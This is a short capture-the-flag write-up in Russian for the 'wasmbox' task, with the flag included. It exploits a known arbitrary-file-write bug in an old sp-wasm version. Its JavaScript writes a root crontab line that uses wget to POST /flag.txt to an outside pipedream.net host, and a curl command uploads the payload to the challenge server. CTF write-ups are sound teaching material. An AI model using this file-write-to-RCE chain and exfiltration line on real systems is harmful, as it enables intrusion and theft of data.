## Название: wasmbox
**Описание**: WASM - это удобно, надёжно и... безопасно?  
**Флаг**: `rtctf{Arb1tAry_F1le_wrITE_to_Rce_77e1869985923ac21f19ebc5689de4c5}`  
**Решение**:  
Находим, что используется https://github.com/golemfactory/sp-wasm (sp-wasm-0.1.0.tar.gz), причём старой версии. Находим уязвимость в Github Issues: https://github.com/golemfactory/sp-wasm/issues/18  
Можем записать в `/etc/crontab` что угодно и получить таким образом RCE.  
Компилируем шаблон и дописываем в начало `pi.js`:
```js
const string = '* *    * * *   root    wget --post-data="$(cat /flag.txt)" http://xxxxxxxxx.x.pipedream.net\n';
const uint8Array = new Uint8Array(string.length);
for (let i = 0; i < string.length; i++) {
    uint8Array[i] = string.charCodeAt(i);
}
writeFile('/etc/crontab', uint8Array);
```

Отправим:
```sh
$ curl -X POST -H "Content-Type: multipart/form-data" -H "POW-Token: U5x4AdLsGhaNS2gYpIx3ntiKoqGUn4nQ" -F "js_file=@./pi.js" -F "wasm_file=@./pi.wasm" http://80.87.202.240:50005/run_my_wasm_app
Pi calculated with nbofterms=50: 3.12159
```
На эндпоинт прилетит флаг (в теле POST-запроса).
